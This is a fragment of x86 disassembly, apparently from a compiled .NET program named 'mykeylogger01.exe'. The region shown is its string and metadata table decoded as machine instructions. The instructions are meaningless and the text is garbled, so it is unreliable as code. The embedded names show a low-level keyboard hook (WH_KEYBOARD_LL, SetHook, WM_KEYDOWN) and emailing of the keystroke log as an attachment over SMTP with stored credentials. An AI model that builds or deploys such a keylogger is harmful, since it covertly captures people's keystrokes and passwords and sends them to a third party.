  402bef:	4d                   	dec    %ebp
  402bf0:	41                   	inc    %ecx
  402bf1:	49                   	dec    %ecx
  402bf2:	4c                   	dec    %esp
  402bf3:	00 57 48             	add    %dl,0x48(%edi)
  402bf6:	5f                   	pop    %edi
  402bf7:	4b                   	dec    %ebx
  402bf8:	45                   	inc    %ebp
  402bf9:	59                   	pop    %ecx
  402bfa:	42                   	inc    %edx
  402bfb:	4f                   	dec    %edi
  402bfc:	41                   	inc    %ecx
  402bfd:	52                   	push   %edx
  402bfe:	44                   	inc    %esp
  402bff:	5f                   	pop    %edi
  402c00:	4c                   	dec    %esp
  402c01:	4c                   	dec    %esp
  402c02:	00 57 4d             	add    %dl,0x4d(%edi)
  402c05:	5f                   	pop    %edi
  402c06:	4b                   	dec    %ebx
  402c07:	45                   	inc    %ebp
  402c08:	59                   	pop    %ecx
  402c09:	44                   	inc    %esp
  402c0a:	4f                   	dec    %edi
  402c0b:	57                   	push   %edi
  402c0c:	4e                   	dec    %esi
  402c0d:	00 53 79             	add    %dl,0x79(%ebx)
  402c10:	73 74                	jae    0x402c86
  402c12:	65 6d                	gs insl (%dx),%es:(%edi)
  402c14:	2e 49                	cs dec %ecx
  402c16:	4f                   	dec    %edi
  402c17:	00 46 52             	add    %al,0x52(%esi)
  402c1a:	4f                   	dec    %edi
  402c1b:	4d                   	dec    %ebp
  402c1c:	5f                   	pop    %edi
  402c1d:	45                   	inc    %ebp
  402c1e:	4d                   	dec    %ebp
  402c1f:	41                   	inc    %ecx
  402c20:	49                   	dec    %ecx
  402c21:	4c                   	dec    %esp
  402c22:	5f                   	pop    %edi
  402c23:	41                   	inc    %ecx
  402c24:	44                   	inc    %esp
  402c25:	44                   	inc    %esp
  402c26:	52                   	push   %edx
  402c27:	45                   	inc    %ebp
  402c28:	53                   	push   %ebx
  402c29:	53                   	push   %ebx
  402c2a:	00 54 4f 5f          	add    %dl,0x5f(%edi,%ecx,2)
  402c2e:	45                   	inc    %ebp
  402c2f:	4d                   	dec    %ebp
  402c30:	41                   	inc    %ecx
  402c31:	49                   	dec    %ecx
  402c32:	4c                   	dec    %esp
  402c33:	5f                   	pop    %edi
  402c34:	41                   	inc    %ecx
  402c35:	44                   	inc    %esp
  402c36:	44                   	inc    %esp
  402c37:	52                   	push   %edx
  402c38:	45                   	inc    %ebp
  402c39:	53                   	push   %ebx
  402c3a:	53                   	push   %ebx
  402c3b:	00 49 4e             	add    %cl,0x4e(%ecx)
  402c3e:	43                   	inc    %ebx
  402c3f:	4c                   	dec    %esp
  402c40:	55                   	push   %ebp
  402c41:	44                   	inc    %esp
  402c42:	45                   	inc    %ebp
  402c43:	5f                   	pop    %edi
  402c44:	4c                   	dec    %esp
  402c45:	4f                   	dec    %edi
  402c46:	47                   	inc    %edi
  402c47:	5f                   	pop    %edi
  402c48:	41                   	inc    %ecx
  402c49:	53                   	push   %ebx
  402c4a:	5f                   	pop    %edi
  402c4b:	41                   	inc    %ecx
  402c4c:	54                   	push   %esp
  402c4d:	54                   	push   %esp
  402c4e:	41                   	inc    %ecx
  402c4f:	43                   	inc    %ebx
  402c50:	48                   	dec    %eax
  402c51:	4d                   	dec    %ebp
  402c52:	45                   	inc    %ebp
  402c53:	4e                   	dec    %esi
  402c54:	54                   	push   %esp
  402c55:	00 6d 73             	add    %ch,0x73(%ebp)
  402c58:	63 6f 72             	arpl   %ebp,0x72(%edi)
  402c5b:	6c                   	insb   (%dx),%es:(%edi)
  402c5c:	69 62 00 4c 6f 77 4c 	imul   $0x4c776f4c,0x0(%edx),%esp
  402c63:	65 76 65             	gs jbe 0x402ccb
  402c66:	6c                   	insb   (%dx),%es:(%edi)
  402c67:	4b                   	dec    %ebx
  402c68:	65 79 62             	gs jns 0x402ccd
  402c6b:	6f                   	outsl  %ds:(%esi),(%dx)
  402c6c:	61                   	popa
  402c6d:	72 64                	jb     0x402cd3
  402c6f:	50                   	push   %eax
  402c70:	72 6f                	jb     0x402ce1
  402c72:	63 00                	arpl   %eax,(%eax)
  402c74:	70 72                	jo     0x402ce8
  402c76:	6f                   	outsl  %ds:(%esi),(%dx)
  402c77:	63 00                	arpl   %eax,(%eax)
  402c79:	64 77 54             	fs ja  0x402cd0
  402c7c:	68 72 65 61 64       	push   $0x64616572
  402c81:	49                   	dec    %ecx
  402c82:	64 00 54 68 72       	add    %dl,%fs:0x72(%eax,%ebp,2)
  402c87:	65 61                	gs popa
  402c89:	64 00 41 64          	add    %al,%fs:0x64(%ecx)
  402c8d:	64 00 52 65          	add    %dl,%fs:0x65(%edx)
  402c91:	61                   	popa
  402c92:	64 54                	fs push %esp
  402c94:	6f                   	outsl  %ds:(%esi),(%dx)
  402c95:	45                   	inc    %ebp
  402c96:	6e                   	outsb  %ds:(%esi),(%dx)
  402c97:	64 00 53 65          	add    %dl,%fs:0x65(%ebx)
  402c9b:	6e                   	outsb  %ds:(%esi),(%dx)
  402c9c:	64 00 68 4d          	add    %ch,%fs:0x4d(%eax)
  402ca0:	6f                   	outsl  %ds:(%esi),(%dx)
  402ca1:	64 00 73 65          	add    %dh,%fs:0x65(%ebx)
  402ca5:	74 5f                	je     0x402d06
  402ca7:	44                   	inc    %esp
  402ca8:	65 6c                	gs insb (%dx),%es:(%edi)
  402caa:	69 76 65 72 79 4d 65 	imul   $0x654d7972,0x65(%esi),%esi
  402cb1:	74 68                	je     0x402d1b
  402cb3:	6f                   	outsl  %ds:(%esi),(%dx)
  402cb4:	64 00 53 6d          	add    %dl,%fs:0x6d(%ebx)
  402cb8:	74 70                	je     0x402d2a
  402cba:	44                   	inc    %esp
  402cbb:	65 6c                	gs insb (%dx),%es:(%edi)
  402cbd:	69 76 65 72 79 4d 65 	imul   $0x654d7972,0x65(%esi),%esi
  402cc4:	74 68                	je     0x402d2e
  402cc6:	6f                   	outsl  %ds:(%esi),(%dx)
  402cc7:	64 00 6d 65          	add    %ch,%fs:0x65(%ebp)
  402ccb:	74 68                	je     0x402d35
  402ccd:	6f                   	outsl  %ds:(%esi),(%dx)
  402cce:	64 00 6e 43          	add    %ch,%fs:0x43(%esi)
  402cd2:	6f                   	outsl  %ds:(%esi),(%dx)
  402cd3:	64 65 00 67 65       	fs add %ah,%gs:0x65(%edi)
  402cd8:	74 5f                	je     0x402d39
  402cda:	4d                   	dec    %ebp
  402cdb:	65 73 73             	gs jae 0x402d51
  402cde:	61                   	popa
  402cdf:	67 65 00 4d 61       	add    %cl,%gs:0x61(%di)
  402ce4:	69 6c 4d 65 73 73 61 	imul   $0x67617373,0x65(%ebp,%ecx,2),%ebp
  402ceb:	67 
  402cec:	65 00 45 6e          	add    %al,%gs:0x6e(%ebp)
  402cf0:	64 49                	fs dec %ecx
  402cf2:	6e                   	outsb  %ds:(%esi),(%dx)
  402cf3:	76 6f                	jbe    0x402d64
  402cf5:	6b 65 00 42          	imul   $0x42,0x0(%ebp),%esp
  402cf9:	65 67 69 6e 49 6e 76 	imul   $0x6b6f766e,%gs:0x49(%bp),%ebp
  402d00:	6f 6b 
  402d02:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  402d06:	74 4d                	je     0x402d55
  402d08:	6f                   	outsl  %ds:(%esi),(%dx)
  402d09:	64 75 6c             	fs jne 0x402d78
  402d0c:	65 48                	gs dec %eax
  402d0e:	61                   	popa
  402d0f:	6e                   	outsb  %ds:(%esi),(%dx)
  402d10:	64 6c                	fs insb (%dx),%es:(%edi)
  402d12:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  402d16:	6e                   	outsb  %ds:(%esi),(%dx)
  402d17:	73 6f                	jae    0x402d88
  402d19:	6c                   	insb   (%dx),%es:(%edi)
  402d1a:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  402d1e:	74 5f                	je     0x402d7f
  402d20:	4d                   	dec    %ebp
  402d21:	61                   	popa
  402d22:	69 6e 4d 6f 64 75 6c 	imul   $0x6c75646f,0x4d(%esi),%ebp
  402d29:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  402d2d:	6f                   	outsl  %ds:(%esi),(%dx)
  402d2e:	63 65 73             	arpl   %esp,0x73(%ebp)
  402d31:	73 4d                	jae    0x402d80
  402d33:	6f                   	outsl  %ds:(%esi),(%dx)
  402d34:	64 75 6c             	fs jne 0x402da3
  402d37:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  402d3b:	74 5f                	je     0x402d9c
  402d3d:	4d                   	dec    %ebp
  402d3e:	6f                   	outsl  %ds:(%esi),(%dx)
  402d3f:	64 75 6c             	fs jne 0x402dae
  402d42:	65 4e                	gs dec %esi
  402d44:	61                   	popa
  402d45:	6d                   	insl   (%dx),%es:(%edi)
  402d46:	65 00 6c 70 4d       	add    %ch,%gs:0x4d(%eax,%esi,2)
  402d4b:	6f                   	outsl  %ds:(%esi),(%dx)
  402d4c:	64 75 6c             	fs jne 0x402dbb
  402d4f:	65 4e                	gs dec %esi
  402d51:	61                   	popa
  402d52:	6d                   	insl   (%dx),%es:(%edi)
  402d53:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  402d57:	74 5f                	je     0x402db8
  402d59:	55                   	push   %ebp
  402d5a:	73 65                	jae    0x402dc1
  402d5c:	72 4e                	jb     0x402dac
  402d5e:	61                   	popa
  402d5f:	6d                   	insl   (%dx),%es:(%edi)
  402d60:	65 00 44 61 74       	add    %al,%gs:0x74(%ecx,%eiz,2)
  402d65:	65 54                	gs push %esp
  402d67:	69 6d 65 00 57 72 69 	imul   $0x69725700,0x65(%ebp),%ebp
  402d6e:	74 65                	je     0x402dd5
  402d70:	4c                   	dec    %esp
  402d71:	69 6e 65 00 6c 6c 6b 	imul   $0x6b6c6c00,0x65(%esi),%ebp
  402d78:	50                   	push   %eax
  402d79:	72 6f                	jb     0x402dea
  402d7b:	63 65 64             	arpl   %esp,0x64(%ebp)
  402d7e:	75 72                	jne    0x402df2
  402d80:	65 00 43 6c          	add    %al,%gs:0x6c(%ebx)
  402d84:	6f                   	outsl  %ds:(%esi),(%dx)
  402d85:	73 65                	jae    0x402dec
  402d87:	00 44 69 73          	add    %al,0x73(%ecx,%ebp,2)
  402d8b:	70 6f                	jo     0x402dfc
  402d8d:	73 65                	jae    0x402df4
  402d8f:	00 4d 75             	add    %cl,0x75(%ebp)
  402d92:	6c                   	insb   (%dx),%es:(%edi)
  402d93:	74 69                	je     0x402dfe
  402d95:	63 61 73             	arpl   %esp,0x73(%ecx)
  402d98:	74 44                	je     0x402dde
  402d9a:	65 6c                	gs insb (%dx),%es:(%edi)
  402d9c:	65 67 61             	gs addr16 popa
  402d9f:	74 65                	je     0x402e06
  402da1:	00 44 65 6c          	add    %al,0x6c(%ebp,%eiz,2)
  402da5:	65 74 65             	gs je  0x402e0d
  402da8:	00 57 72             	add    %dl,0x72(%edi)
  402dab:	69 74 65 00 47 75 69 	imul   $0x64697547,0x0(%ebp,%eiz,2),%esi
  402db2:	64 
  402db3:	41                   	inc    %ecx
  402db4:	74 74                	je     0x402e2a
  402db6:	72 69                	jb     0x402e21
  402db8:	62 75 74             	bound  %esi,0x74(%ebp)
  402dbb:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  402dc0:	75 67                	jne    0x402e29
  402dc2:	67 61                	addr16 popa
  402dc4:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  402dc8:	74 74                	je     0x402e3e
  402dca:	72 69                	jb     0x402e35
  402dcc:	62 75 74             	bound  %esi,0x74(%ebp)
  402dcf:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  402dd3:	6d                   	insl   (%dx),%es:(%edi)
  402dd4:	56                   	push   %esi
  402dd5:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%ebx),%esi
  402ddc:	74 74                	je     0x402e52
  402dde:	72 69                	jb     0x402e49
  402de0:	62 75 74             	bound  %esi,0x74(%ebp)
  402de3:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  402de7:	73 65                	jae    0x402e4e
  402de9:	6d                   	insl   (%dx),%es:(%edi)
  402dea:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  402dee:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
  402df5:	72 
  402df6:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  402dfd:	73 73                	jae    0x402e72
  402dff:	65 6d                	gs insl (%dx),%es:(%edi)
  402e01:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  402e05:	72 61                	jb     0x402e68
  402e07:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
  402e0a:	61                   	popa
  402e0b:	72 6b                	jb     0x402e78
  402e0d:	41                   	inc    %ecx
  402e0e:	74 74                	je     0x402e84
  402e10:	72 69                	jb     0x402e7b
  402e12:	62 75 74             	bound  %esi,0x74(%ebp)
  402e15:	65 00 54 61 72       	add    %dl,%gs:0x72(%ecx,%eiz,2)
  402e1a:	67 65 74 46          	addr16 gs je 0x402e64
  402e1e:	72 61                	jb     0x402e81
  402e20:	6d                   	insl   (%dx),%es:(%edi)
  402e21:	65 77 6f             	gs ja  0x402e93
  402e24:	72 6b                	jb     0x402e91
  402e26:	41                   	inc    %ecx
  402e27:	74 74                	je     0x402e9d
  402e29:	72 69                	jb     0x402e94
  402e2b:	62 75 74             	bound  %esi,0x74(%ebp)
  402e2e:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  402e32:	73 65                	jae    0x402e99
  402e34:	6d                   	insl   (%dx),%es:(%edi)
  402e35:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
  402e39:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
  402e40:	69 
  402e41:	6f                   	outsl  %ds:(%esi),(%dx)
  402e42:	6e                   	outsb  %ds:(%esi),(%dx)
  402e43:	41                   	inc    %ecx
  402e44:	74 74                	je     0x402eba
  402e46:	72 69                	jb     0x402eb1
  402e48:	62 75 74             	bound  %esi,0x74(%ebp)
  402e4b:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  402e4f:	73 65                	jae    0x402eb6
  402e51:	6d                   	insl   (%dx),%es:(%edi)
  402e52:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  402e56:	6f                   	outsl  %ds:(%esi),(%dx)
  402e57:	6e                   	outsb  %ds:(%esi),(%dx)
  402e58:	66 69 67 75 72 61    	imul   $0x6172,0x75(%edi),%sp
  402e5e:	74 69                	je     0x402ec9
  402e60:	6f                   	outsl  %ds:(%esi),(%dx)
  402e61:	6e                   	outsb  %ds:(%esi),(%dx)
  402e62:	41                   	inc    %ecx
  402e63:	74 74                	je     0x402ed9
  402e65:	72 69                	jb     0x402ed0
  402e67:	62 75 74             	bound  %esi,0x74(%ebp)
  402e6a:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  402e6e:	73 65                	jae    0x402ed5
  402e70:	6d                   	insl   (%dx),%es:(%edi)
  402e71:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
  402e75:	65 73 63             	gs jae 0x402edb
  402e78:	72 69                	jb     0x402ee3
  402e7a:	70 74                	jo     0x402ef0
  402e7c:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  402e83:	69 62 75 74 65 00 43 	imul   $0x43006574,0x75(%edx),%esp
  402e8a:	6f                   	outsl  %ds:(%esi),(%dx)
  402e8b:	6d                   	insl   (%dx),%es:(%edi)
  402e8c:	70 69                	jo     0x402ef7
  402e8e:	6c                   	insb   (%dx),%es:(%edi)
  402e8f:	61                   	popa
  402e90:	74 69                	je     0x402efb
  402e92:	6f                   	outsl  %ds:(%esi),(%dx)
  402e93:	6e                   	outsb  %ds:(%esi),(%dx)
  402e94:	52                   	push   %edx
  402e95:	65 6c                	gs insb (%dx),%es:(%edi)
  402e97:	61                   	popa
  402e98:	78 61                	js     0x402efb
  402e9a:	74 69                	je     0x402f05
  402e9c:	6f                   	outsl  %ds:(%esi),(%dx)
  402e9d:	6e                   	outsb  %ds:(%esi),(%dx)
  402e9e:	73 41                	jae    0x402ee1
  402ea0:	74 74                	je     0x402f16
  402ea2:	72 69                	jb     0x402f0d
  402ea4:	62 75 74             	bound  %esi,0x74(%ebp)
  402ea7:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  402eab:	73 65                	jae    0x402f12
  402ead:	6d                   	insl   (%dx),%es:(%edi)
  402eae:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
  402eb2:	72 6f                	jb     0x402f23
  402eb4:	64 75 63             	fs jne 0x402f1a
  402eb7:	74 41                	je     0x402efa
  402eb9:	74 74                	je     0x402f2f
  402ebb:	72 69                	jb     0x402f26
  402ebd:	62 75 74             	bound  %esi,0x74(%ebp)
  402ec0:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  402ec4:	73 65                	jae    0x402f2b
  402ec6:	6d                   	insl   (%dx),%es:(%edi)
  402ec7:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  402ecb:	6f                   	outsl  %ds:(%esi),(%dx)
  402ecc:	70 79                	jo     0x402f47
  402ece:	72 69                	jb     0x402f39
  402ed0:	67 68 74 41 74 74    	addr16 push $0x74744174
  402ed6:	72 69                	jb     0x402f41
  402ed8:	62 75 74             	bound  %esi,0x74(%ebp)
  402edb:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  402edf:	73 65                	jae    0x402f46
  402ee1:	6d                   	insl   (%dx),%es:(%edi)
  402ee2:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  402ee6:	6f                   	outsl  %ds:(%esi),(%dx)
  402ee7:	6d                   	insl   (%dx),%es:(%edi)
  402ee8:	70 61                	jo     0x402f4b
  402eea:	6e                   	outsb  %ds:(%esi),(%dx)
  402eeb:	79 41                	jns    0x402f2e
  402eed:	74 74                	je     0x402f63
  402eef:	72 69                	jb     0x402f5a
  402ef1:	62 75 74             	bound  %esi,0x74(%ebp)
  402ef4:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  402ef8:	6e                   	outsb  %ds:(%esi),(%dx)
  402ef9:	74 69                	je     0x402f64
  402efb:	6d                   	insl   (%dx),%es:(%edi)
  402efc:	65 43                	gs inc %ebx
  402efe:	6f                   	outsl  %ds:(%esi),(%dx)
  402eff:	6d                   	insl   (%dx),%es:(%edi)
  402f00:	70 61                	jo     0x402f63
  402f02:	74 69                	je     0x402f6d
  402f04:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  402f07:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  402f0e:	69 
  402f0f:	62 75 74             	bound  %esi,0x74(%ebp)
  402f12:	65 00 6d 79          	add    %ch,%gs:0x79(%ebp)
  402f16:	6b 65 79 6c          	imul   $0x6c,0x79(%ebp),%esp
  402f1a:	6f                   	outsl  %ds:(%esi),(%dx)
  402f1b:	67 67 65 72 30       	addr16 addr16 gs jb 0x402f50
  402f20:	31 2e                	xor    %ebp,(%esi)
  402f22:	65 78 65             	gs js  0x402f8a
  402f25:	00 53 79             	add    %dl,0x79(%ebx)
  402f28:	73 74                	jae    0x402f9e
  402f2a:	65 6d                	gs insl (%dx),%es:(%edi)
  402f2c:	2e 54                	cs push %esp
  402f2e:	68 72 65 61 64       	push   $0x64616572
  402f33:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  402f3a:	74 65                	je     0x402fa1
  402f3c:	6d                   	insl   (%dx),%es:(%edi)
  402f3d:	2e 52                	cs push %edx
  402f3f:	75 6e                	jne    0x402faf
  402f41:	74 69                	je     0x402fac
  402f43:	6d                   	insl   (%dx),%es:(%edi)
  402f44:	65 2e 56             	gs cs push %esi
  402f47:	65 72 73             	gs jb  0x402fbd
  402f4a:	69 6f 6e 69 6e 67 00 	imul   $0x676e69,0x6e(%edi),%ebp
  402f51:	54                   	push   %esp
  402f52:	6f                   	outsl  %ds:(%esi),(%dx)
  402f53:	53                   	push   %ebx
  402f54:	74 72                	je     0x402fc8
  402f56:	69 6e 67 00 67 65 74 	imul   $0x74656700,0x67(%esi),%ebp
  402f5d:	5f                   	pop    %edi
  402f5e:	4c                   	dec    %esp
  402f5f:	65 6e                	outsb  %gs:(%esi),(%dx)
  402f61:	67 74 68             	addr16 je 0x402fcc
  402f64:	00 67 65             	add    %ah,0x65(%edi)
  402f67:	74 5f                	je     0x402fc8
  402f69:	4d                   	dec    %ebp
  402f6a:	6f                   	outsl  %ds:(%esi),(%dx)
  402f6b:	6e                   	outsb  %ds:(%esi),(%dx)
  402f6c:	74 68                	je     0x402fd6
  402f6e:	00 41 73             	add    %al,0x73(%ecx)
  402f71:	79 6e                	jns    0x402fe1
  402f73:	63 43 61             	arpl   %eax,0x61(%ebx)
  402f76:	6c                   	insb   (%dx),%es:(%edi)
  402f77:	6c                   	insb   (%dx),%es:(%edi)
  402f78:	62 61 63             	bound  %esp,0x63(%ecx)
  402f7b:	6b 00 48             	imul   $0x48,(%eax),%eax
  402f7e:	6f                   	outsl  %ds:(%esi),(%dx)
  402f7f:	6f                   	outsl  %ds:(%esi),(%dx)
  402f80:	6b 43 61 6c          	imul   $0x6c,0x61(%ebx),%eax
  402f84:	6c                   	insb   (%dx),%es:(%edi)
  402f85:	62 61 63             	bound  %esp,0x63(%ecx)
  402f88:	6b 00 63             	imul   $0x63,(%eax),%eax
  402f8b:	61                   	popa
  402f8c:	6c                   	insb   (%dx),%es:(%edi)
  402f8d:	6c                   	insb   (%dx),%es:(%edi)
  402f8e:	62 61 63             	bound  %esp,0x63(%ecx)
  402f91:	6b 00 68             	imul   $0x68,(%eax),%eax
  402f94:	68 6b 00 69 64       	push   $0x6469006b
  402f99:	48                   	dec    %eax
  402f9a:	6f                   	outsl  %ds:(%esi),(%dx)
  402f9b:	6f                   	outsl  %ds:(%esi),(%dx)
  402f9c:	6b 00 53             	imul   $0x53,(%eax),%eax
  402f9f:	65 74 48             	gs je  0x402fea
  402fa2:	6f                   	outsl  %ds:(%esi),(%dx)
  402fa3:	6f                   	outsl  %ds:(%esi),(%dx)
  402fa4:	6b 00 68             	imul   $0x68,(%eax),%eax
  402fa7:	6f                   	outsl  %ds:(%esi),(%dx)
  402fa8:	6f                   	outsl  %ds:(%esi),(%dx)
  402fa9:	6b 00 4d             	imul   $0x4d,(%eax),%eax
  402fac:	61                   	popa
  402fad:	72 73                	jb     0x403022
  402faf:	68 61 6c 00 4e       	push   $0x4e006c61
  402fb4:	65 74 77             	gs je  0x40302e
  402fb7:	6f                   	outsl  %ds:(%esi),(%dx)
  402fb8:	72 6b                	jb     0x403025
  402fba:	43                   	inc    %ebx
  402fbb:	72 65                	jb     0x403022
  402fbd:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  402fc0:	74 69                	je     0x40302b
  402fc2:	61                   	popa
  402fc3:	6c                   	insb   (%dx),%es:(%edi)
  402fc4:	00 53 79             	add    %dl,0x79(%ebx)
  402fc7:	73 74                	jae    0x40303d
  402fc9:	65 6d                	gs insl (%dx),%es:(%edi)
  402fcb:	2e 43                	cs inc %ebx
  402fcd:	6f                   	outsl  %ds:(%esi),(%dx)
  402fce:	6c                   	insb   (%dx),%es:(%edi)
  402fcf:	6c                   	insb   (%dx),%es:(%edi)
  402fd0:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  402fd5:	6e                   	outsb  %ds:(%esi),(%dx)
  402fd6:	73 2e                	jae    0x403006
  402fd8:	4f                   	dec    %edi
  402fd9:	62 6a 65             	bound  %ebp,0x65(%edx)
  402fdc:	63 74 4d 6f          	arpl   %esi,0x6f(%ebp,%ecx,2)
  402fe0:	64 65 6c             	fs gs insb (%dx),%es:(%edi)
  402fe3:	00 53 79             	add    %dl,0x79(%ebx)
  402fe6:	73 74                	jae    0x40305c
  402fe8:	65 6d                	gs insl (%dx),%es:(%edi)
  402fea:	2e 4e                	cs dec %esi
  402fec:	65 74 2e             	gs je  0x40301d
  402fef:	4d                   	dec    %ebp
  402ff0:	61                   	popa
  402ff1:	69 6c 00 73 65 6e 64 	imul   $0x4d646e65,0x73(%eax,%eax,1),%ebp
  402ff8:	4d 
  402ff9:	61                   	popa
  402ffa:	69 6c 00 6b 65 72 6e 	imul   $0x656e7265,0x6b(%eax,%eax,1),%ebp
  403001:	65 
  403002:	6c                   	insb   (%dx),%es:(%edi)
  403003:	33 32                	xor    (%edx),%esi
  403005:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  403008:	6c                   	insb   (%dx),%es:(%edi)
  403009:	00 75 73             	add    %dh,0x73(%ebp)
  40300c:	65 72 33             	gs jb  0x403042
  40300f:	32 2e                	xor    (%esi),%ch
  403011:	64 6c                	fs insb (%dx),%es:(%edi)
  403013:	6c                   	insb   (%dx),%es:(%edi)
  403014:	00 73 65             	add    %dh,0x65(%ebx)
  403017:	74 5f                	je     0x403078
  403019:	49                   	dec    %ecx
  40301a:	73 42                	jae    0x40305e
  40301c:	6f                   	outsl  %ds:(%esi),(%dx)
  40301d:	64 79 48             	fs jns 0x403068
  403020:	74 6d                	je     0x40308f
  403022:	6c                   	insb   (%dx),%es:(%edi)
  403023:	00 73 65             	add    %dh,0x65(%ebx)
  403026:	74 5f                	je     0x403087
  403028:	45                   	inc    %ebp
  403029:	6e                   	outsb  %ds:(%esi),(%dx)
  40302a:	61                   	popa
  40302b:	62 6c 65 53          	bound  %ebp,0x53(%ebp,%eiz,2)
  40302f:	73 6c                	jae    0x40309d
  403031:	00 6c 50 61          	add    %ch,0x61(%eax,%edx,2)
  403035:	72 61                	jb     0x403098
  403037:	6d                   	insl   (%dx),%es:(%edi)
  403038:	00 77 50             	add    %dh,0x50(%edi)
  40303b:	61                   	popa
  40303c:	72 61                	jb     0x40309f
  40303e:	6d                   	insl   (%dx),%es:(%edi)
  40303f:	00 50 72             	add    %dl,0x72(%eax)
  403042:	6f                   	outsl  %ds:(%esi),(%dx)
  403043:	67 72 61             	addr16 jb 0x4030a7
  403046:	6d                   	insl   (%dx),%es:(%edi)
  403047:	00 53 79             	add    %dl,0x79(%ebx)
  40304a:	73 74                	jae    0x4030c0
  40304c:	65 6d                	gs insl (%dx),%es:(%edi)
  40304e:	00 73 65             	add    %dh,0x65(%ebx)
  403051:	74 5f                	je     0x4030b2
  403053:	46                   	inc    %esi
  403054:	72 6f                	jb     0x4030c5
  403056:	6d                   	insl   (%dx),%es:(%edi)
  403057:	00 6c 70 66          	add    %ch,0x66(%eax,%esi,2)
  40305b:	6e                   	outsb  %ds:(%esi),(%dx)
  40305c:	00 4d 61             	add    %cl,0x61(%ebp)
  40305f:	69 6e 00 41 70 70 6c 	imul   $0x6c707041,0x0(%esi),%ebp
  403066:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  40306d:	00 53 79             	add    %dl,0x79(%ebx)
  403070:	73 74                	jae    0x4030e6
  403072:	65 6d                	gs insl (%dx),%es:(%edi)
  403074:	2e 52                	cs push %edx
  403076:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  403079:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  40307e:	6e                   	outsb  %ds:(%esi),(%dx)
  40307f:	00 4d 61             	add    %cl,0x61(%ebp)
  403082:	69 6c 41 64 64 72 65 	imul   $0x73657264,0x64(%ecx,%eax,2),%ebp
  403089:	73 
  40308a:	73 43                	jae    0x4030cf
  40308c:	6f                   	outsl  %ds:(%esi),(%dx)
  40308d:	6c                   	insb   (%dx),%es:(%edi)
  40308e:	6c                   	insb   (%dx),%es:(%edi)
  40308f:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  403094:	6e                   	outsb  %ds:(%esi),(%dx)
  403095:	00 41 74             	add    %al,0x74(%ecx)
  403098:	74 61                	je     0x4030fb
  40309a:	63 68 6d             	arpl   %ebp,0x6d(%eax)
  40309d:	65 6e                	outsb  %gs:(%esi),(%dx)
  40309f:	74 43                	je     0x4030e4
  4030a1:	6f                   	outsl  %ds:(%esi),(%dx)
  4030a2:	6c                   	insb   (%dx),%es:(%edi)
  4030a3:	6c                   	insb   (%dx),%es:(%edi)
  4030a4:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4030a9:	6e                   	outsb  %ds:(%esi),(%dx)
  4030aa:	00 45 78             	add    %al,0x78(%ebp)
  4030ad:	63 65 70             	arpl   %esp,0x70(%ebp)
  4030b0:	74 69                	je     0x40311b
  4030b2:	6f                   	outsl  %ds:(%esi),(%dx)
  4030b3:	6e                   	outsb  %ds:(%esi),(%dx)
  4030b4:	00 52 75             	add    %dl,0x75(%edx)
  4030b7:	6e                   	outsb  %ds:(%esi),(%dx)
  4030b8:	00 67 65             	add    %ah,0x65(%edi)
  4030bb:	74 5f                	je     0x40311c
  4030bd:	54                   	push   %esp
  4030be:	6f                   	outsl  %ds:(%esi),(%dx)
  4030bf:	00 43 6f             	add    %al,0x6f(%ebx)
  4030c2:	70 79                	jo     0x40313d
  4030c4:	54                   	push   %esp
  4030c5:	6f                   	outsl  %ds:(%esi),(%dx)
  4030c6:	00 46 69             	add    %al,0x69(%esi)
  4030c9:	6c                   	insb   (%dx),%es:(%edi)
  4030ca:	65 49                	gs dec %ecx
  4030cc:	6e                   	outsb  %ds:(%esi),(%dx)
  4030cd:	66 6f                	outsw  %ds:(%esi),(%dx)
  4030cf:	00 46 69             	add    %al,0x69(%esi)
  4030d2:	6c                   	insb   (%dx),%es:(%edi)
  4030d3:	65 53                	gs push %ebx
  4030d5:	79 73                	jns    0x40314a
  4030d7:	74 65                	je     0x40313e
